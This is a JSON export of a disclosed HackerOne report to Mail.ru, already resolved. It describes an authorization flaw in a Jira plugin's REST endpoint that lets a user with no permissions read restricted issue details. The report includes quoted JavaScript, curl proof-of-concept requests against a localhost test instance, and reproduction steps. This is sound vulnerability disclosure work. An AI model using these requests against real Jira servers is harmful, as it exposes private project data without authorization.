@@ -1,0 +1,350 @@
+{
+    "id": 1099489,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDk5NDg5",
+    "url": "https://hackerone.com/reports/1099489",
+    "title": "REST API Endpoint leads to Unauthorized user disclosed private [ issue ] details",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2021-02-09T17:41:45.237Z",
+    "submitted_at": "2021-02-09T17:41:45.299Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "updatelap",
+        "url": "/updatelap",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/vb35rkj89g30glscmc8zqj6auios/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 65,
+        "url": "https://hackerone.com/mailru",
+        "handle": "mailru",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "disabled",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Mail.ru",
+            "twitter_handle": "",
+            "website": "https://vk.company/",
+            "about": "Building the Internet since 1998"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-11-06T18:48:10.501Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-10-07T18:48:02.080Z",
+    "team_member_agreed_on_going_public_at": null,
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "## Summary\nJira allows an administrator to restrict access to projects to specific users only. Or adjusting all project properties to be available only to the system administrator, which means that all users in the jira account cannot access issues, project, dashboard and any information about the project, view, modify, delete or add to the project, or even Conf. for the apps associated with this project. So, After install and analyzing the  [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview) source code I found several endpoints. some of this endpoint Leads Unauthorized user access to disclose private data.\n\n# Description:\nAfter installing and analyze the source code [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview), I headed to the next file\n\n`\nQuery Issues Custom Fields/ru/mail/jira/plugins/lf/queryfields/js/linker-field-app.js\n`\n\nWhen looking for endpoints in this file, you find the next endpoint: ` /rest/queryfields/1.0/customfields/linkerfield/option?issueKey=`\n\n```js \nE = function () {\n                    function e(e, t, n, a, i, l, r) {\n                        var c = this;\n                        this.hasError = !1, this.isLoading = !1, this.changeLoadingState = function (e) {\n                            c.isLoading = e\n                        }, this.loadValue = function () {\n                            c.isLoading = !0, null == c.issueKey || 0 == c.issueKey.length ? O.a.get(b()() + \"/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=\" + c.defaultValue).then(Object(p.action)((function (e) {\n                                c.value = e.data\n                            }))).catch().finally((function () {\n                                return c.changeLoadingState(!1)\n....\n```\n\nAs the parameter name indicates, it takes a value for `issueKey=` so I created a new case and copied the issue keyID and added it to the endpoint.\n`{BaseUrl}/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1` And as it appears in the `.js` code, this request is sent through the GET Request `O.a.get(b()()`, so I sent this request using the administrator's account and the response contains the case information\n\n```bash\ncurl  -X GET -u admin:admin \"http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1\"\n```\n\n## Response \n\n```json\n{\n   \"key\":\"PRJ-2\",\n   \"summary\":\"As a product owner, I'd like to express work in terms of actual user problems, aka User Stories, and place them in the backlog ... etc\",\n   \"description\":\"When you click  Create Issue....etc\",\n   \"issueType\":\"Story\",\n   \"issueTypeIconUrl\":\"/images/icons/issuetypes/story.svg\",\n   \"status\":\"To Do\",\n   \"statusColor\":\"blue-gray\",\n   \"priority\":\"Medium\",\n   \"priorityIconUrl\":\"/images/icons/priorities/medium.svg\",\n   \"assignee\":{\n      \"displayName\":\"Unassigned\"\n   },\n   \"deleted\":false,\n   \"customFields\":[\n      \n   ]\n}\n```\n\nThen I created the account for user B and from the administrator account restricted the access of the user so that it would not have any permissions. This means that User B cannot access projects, cases, dashboards, or anything with userB account. Using User B's account, I resubmitted the previous request, and it turned out that the request was not protected as the user was able to access all the issues information\n\n```bash\ncurl  -X GET -u user:user \"http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1\"\n```\n\nIn this case, User B can disclose private information about all issues in the `jira account` that he is supposed to not reach by sending the following request:\n\n### Steps:\n\n1. Create Jira account.\n1. Create Jira user with no_permissions.\n1. The administrator limits access to the project only to the administrator.\n\n{F1189720}\n1. Admin install  [Query Issues Custom Fields](https://marketplace.atlassian.com/apps/1211009/query-issues-custom-fields?hosting=server&tab=overview). \n1. using the user with no permission, call:\n\n```bash\ncurl  -X GET -u user:user \"http://localhost:8080/rest/queryfields/1.0/customfields/linkerfield/option?issueKey=PRJ-1\"\n```\n\nBest,\n* Jafar\n\n## Impact\n\nREST API Endpoint leads to Unauthorized user disclosed private [ issue ] details",
+    "bounty_amount": "1000.0",
+    "formatted_bounty": "$1,000",
+    "weakness": {
+        "id": 75,
+        "name": "Privilege Escalation"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1189720,
+            "file_name": "PrivPerSch.png",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/57katja58rxw0rq0ypn7d9c4fxd8?response-content-disposition=attachment%3B%20filename%3D%22PrivPerSch.png%22%3B%20filename%2A%3DUTF-8%27%27PrivPerSch.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQRZXXXBVF%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070609Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGIRenCSrfPcgTzSaO8QX26B9paJvvasIMLYRmcGzR1cAiBjFJbPsOh%2Bik2kOVW9ts7HvOwRMYnKfesm5Nr%2BufbNjSq6BQif%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAMaDDAxMzYxOTI3NDg0OSIMsePPIpSJgdLj%2FGf1Ko4FqUJrhAMTg0ZIyb%2B1aVR%2FG44A2mOWZ6x6vGGcep4SvdMaIalmDAmh2pt6So6Qy6pOK2n939v4zbyM6seXirKyRXHKw3iQWhNjJuaJXlE%2FHpe8gmE3e2QADfkOI3u9bV1ho7yEPZHObU5ZkaCwbi3Is6ImJkL6vs5%2F4gEiKto44SQ1kryLDSiuArhEXZm3namcAI5Cjv0xN6eu3QFAwj26WQudVPnFodb9J2UU%2BNY62kiYfZwCkdUYNCV3h3WO77dhZEOKF7EVU2zEwT6i3iwfTz%2FuYPJii%2Bj5JLVrGySxCqLuu7dmgYLq3whyU6X8PjOFtZBZEAQZqoJikhB8g%2BEOp1A6ftYalZsJZFufaQH3B63suBHFinWrFMw%2FCCWa9eHCl%2BvLuhqDl1SvtrU5%2FxQ2fOB3XGBONTD%2B7q0ErqKRM8dzbyvym3KfNnlCZgsbpNp8yTkuBi4eos5SilEGPcT9n6ouE5N9DXS43l4YybpYIky11BVuk2UWkfEK3dJQnhFHIhOYMavdPRSa7lmdi2kEnxCTOXdkGUH%2FKAGLNRsYfow9oEoy4YZGB0FoX8Eq%2B08e452Whmi1JpkJiIRgenUwOU%2B87HWCJrJf%2BS0MSQDs5iILTtYS5iFbalf2GVWwSWLgfVrXYuasVIFmEyHP8cTyFTVVPWf7FbGzfvp2BXB%2BogUB2swB7y6hxqQQu0KsPAmJA4sEdO85nj80PQJYTchcTvnWpMZN1bO5y6Oa4j8pxE08cwvACkQ9eBEhdppZSTKhqiv6TYPjMrRiojGlm2WUIOpmXmZDBKwNL6CzTXZdt%2B2d3t8MhZGBnzal2u85ZD2a4VfqP%2BIWfF4PUlDbjBFrFINI07I%2BobnCRgS0mEUuMJubtqcGOrIBqq44iCmenp9XE9yUHVBdv6l%2BN3SN3TDA8%2BUOBKb0BjOOfC5%2F8dCdNYNF5%2B1thGdyGBRX0juTvEz1KUixIrQ38a2zYJ9WpJoFs%2BFZvOxXJIyeou8u5PXPnplCwDvyxlLqF78G8s7SPGknl0RozlWjJuX%2B7qWoaqc41gdx%2FiYArbSOEB1N32UD3yAr4%2Fn4%2BUBFO41EsEWEoOZ6cTRB3vEOpPx39KopEbOmfSAZ0iPUbZ6J1g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=bd3ce02a3fbc3d34893b8ed8b0c032d709d0cc0ba2a50c9601695845ac9df7cd",
+            "file_size": 74034,
+            "type": "image/png"
+        }
+    ],
+    "allow_singular_disclosure_at": "2021-11-06T18:48:02.159Z",
+    "allow_singular_disclosure_after": -57068287.00141987,
+    "singular_disclosure_allowed": true,
+    "vote_count": 22,
+    "voters": [
+        "bazzadrox",
+        "quickjohn",
+        "h4x0r_dz",
+        "sodium_",
+        "hotmuffin",
+        "yyhk",
+        "official_blackhat13",
+        "enwuft",
+        "sukhdeothakur96",
+        "ivan_ivanov_vi_vi",
+        "and 12 more..."
+    ],
+    "severity": {
+        "rating": "high",
+        "score": 7.1,
+        "author_type": "Team",
+        "metrics": {
+            "attack_vector": "network",
+            "attack_complexity": "high",
+            "privileges_required": "low",
+            "user_interaction": "none",
+            "scope": "unchanged",
+            "confidentiality": "high",
+            "integrity": "none",
+            "availability": "none"
+        }
+    },
+    "structured_scope": {
+        "databaseId": 40418,
+        "asset_type": "OTHER",
+        "asset_identifier": "Ext. A Scope",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 10629539,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ChangedScope",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-02-09T21:37:53.161Z",
+            "updated_at": "2021-02-09T21:37:53.161Z",
+            "actor": {
+                "username": "kpebetka",
+                "cleared": false,
+                "verified": false,
+                "url": "/kpebetka",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "old_scope": "None",
+            "new_scope": "Ext. B Scope",
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 10629552,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "Thank you for your report to Mail.Ru Group! We appreciate your time for helping us to make our web services safer.\n\nYour report have passed an initial review and was assigned to security engineer. Security engineer will contact you only if there are any questions on reproducing the bug or some additional information from you is required. He will manage the patching process. Once the bug is completely fixed, this report is transferred to \"Resolved\" state, it can take some time.\n\nThe bounty decision will be made within few weeks.",
+            "automated_response": false,
+            "created_at": "2021-02-09T21:39:30.238Z",
+            "updated_at": "2021-02-09T21:39:30.238Z",
+            "actor": {
+                "username": "kpebetka",
+                "cleared": false,
+                "verified": false,
+                "url": "/kpebetka",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 10655275,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ChangedScope",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-02-12T13:28:04.308Z",
+            "updated_at": "2021-02-12T13:28:04.308Z",
+            "actor": {
+                "username": "kpebetka",
+                "cleared": false,
+                "verified": false,
+                "url": "/kpebetka",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "old_scope": "Ext. B Scope",
+            "new_scope": "Ext. A Scope",
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 10655295,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": null,
+            "automated_response": false,
+            "created_at": "2021-02-12T13:30:01.888Z",
+            "updated_at": "2021-02-12T13:30:01.888Z",
+            "additional_data": {
+                "old_severity": "High (8.3)",
+                "new_severity": "High (7.1)",
+                "old_severity_id": 981785,
+                "new_severity_id": 984570
+            },
+            "actor": {
+                "username": "kpebetka",
+                "cleared": false,
+                "verified": false,
+                "url": "/kpebetka",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 10655302,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Hello, \n\nbug bounty reward is transferred to your account. You can set payment options and request payout via\nhttps://hackerone.com/settings/bounties\n\nThanks again,\nwaiting for new bug reports from you.\n\nP.S. we are still working to resolve this problem",
+            "automated_response": false,
+            "created_at": "2021-02-12T13:31:02.521Z",
+            "updated_at": "2021-02-12T13:31:02.521Z",
+            "actor": {
+                "url": "/mailru",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Mail.ru"
+                }
+            },
+            "bounty_amount": "1000.0",
+            "bonus_amount": "0.0",
+            "bounty_currency": "usd",
+            "genius_execution_id": null,
+            "team_handle": "mailru",
+            "collaborator": {
+                "username": "updatelap",
+                "url": "/updatelap"
+            }
+        },
+        {
+            "id": 13799300,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "This bug has been fixed! \nPlease confirm that you are no longer able to reproduce the issue. ",
+            "automated_response": false,
+            "created_at": "2021-10-07T16:31:32.440Z",
+            "updated_at": "2021-10-07T16:31:32.440Z",
+            "actor": {
+                "username": "k_vidunkina",
+                "cleared": false,
+                "verified": false,
+                "url": "/k_vidunkina",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "updatelap",
+                "url": "/updatelap"
+            },
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 13800937,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-10-07T18:48:02.113Z",
+            "updated_at": "2021-10-07T18:48:02.113Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "updatelap",
+                "cleared": false,
+                "verified": false,
+                "url": "/updatelap",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/vb35rkj89g30glscmc8zqj6auios/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        },
+        {
+            "id": 14206607,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-11-06T18:48:10.558Z",
+            "updated_at": "2021-11-06T18:48:10.558Z",
+            "actor": {
+                "url": "/mailru",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "Mail.ru"
+                }
+            },
+            "genius_execution_id": null,
+            "team_handle": "mailru"
+        }
+    ],
+    "activity_page_count": 1,
+    "activity_page_number": 1,
+    "summaries": [
+        {
+            "category": "team",
+            "can_view?": true,
+            "can_create?": false
+        },
+        {
+            "category": "researcher",
+            "can_view?": true,
+            "can_create?": false
+        }
+    ]
+}
